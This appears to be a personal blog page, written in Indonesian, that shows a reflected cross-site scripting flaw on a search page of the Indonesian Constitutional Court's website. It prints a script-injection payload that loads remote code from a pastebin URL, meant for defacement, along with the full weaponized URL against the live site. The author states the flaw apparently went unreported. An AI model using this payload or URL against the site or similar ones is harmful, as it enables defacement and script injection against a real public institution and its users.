@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<link rel="shortcut icon" href="https://i1.wp.com/abaykan.com/wp-content/uploads/2019/01/favicon.png">
+<meta name="description" content=""/>
+<meta property="og:title" content="" />
+<meta property="og:description" content="" />
+<meta property="og:url" content="" />
+<meta property="og:site_name" content="" />
+<link href="https://fonts.googleapis.com/css?family=Arvo&display=swap" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="../css/awikwok.css">
+<head>
+	<title></title>
+</head>
+<body>
+	<nav>
+     <a href="../index.htm">Home</a>
+     <a href="../index.htm#coretan">Coretan</a>
+     <a href="../tutorial.htm">Tutorial</a>
+     <a href="../tentang.htm">Tentang</a>
+    </nav>
+	<h1 align="center">XSS on Mahkamah Konstitusi</h1>
+	<h3>Published :</h3>
+	<ul>
+		<li>Time : 18 Juli 2019 22.00 WIB</li>
+        <li>By : Sinyo</li>
+        <li>Reported : None</li>
+	</ul>
+	<h3>Content :</h3>
+    <p>Mahkamah Konstitusi Republik Indonesia (disingkat MKRI) adalah lembaga tinggi negara dalam sistem ketatanegaraan Indonesia yang merupakan pemegang kekuasaan kehakiman bersama-sama dengan Mahkamah Agung.</p>
+    <color><p> Selebihnya bisa di baca di <a href="https://id.wikipedia.org/wiki/Mahkamah_Konstitusi_Republik_Indonesia" target="_blank">SINI</a></p>
+    <h3>PoC : </h3>
+    <p>XSS on Daftar Permohonan Perkara Perselisihan Hasil Pemilihan Umum Tahun 2019 :: <a href="https://www.mahkamahkonstitusi.go.id/index.php?page=web.EFormDetail2019&pages=7&id=7&cari">di sini</a></p>
+    <h3>Payload :</h3>
+    <p>Menggunakan custom html ala ala deface : </p>
+    <div class="border">
+        <pre>&quot;&gt;&lt;script src=&quot;https://pastebin.com/raw/mUBsAPXz&quot;&gt;&lt;/script&gt;</pre>
+    </div>
+    <h3>XSS Url :</h3>
+    <div class="border">
+        <p>https://www.mahkamahkonstitusi.go.id/index.php?page=web.EFormDetail2019&amp;pages=7&amp;id=7&amp;cari=&quot;&gt;&lt;script src=&quot;https://pastebin.com/raw/mUBsAPXz&quot;&gt;&lt;/script&gt;</p>
+    </div>
+    <h3>Screenshot :</h3>
+    <a href="../img/mk/xss.png"><img src="../img/mk/xss.png" alt=""></a>
+    <h3>Coretan : </h3>
+    <p>Ga tau udah di report apa belom, yang penting ada dokumentasi h3h3.</p>
+</body>
+</html>
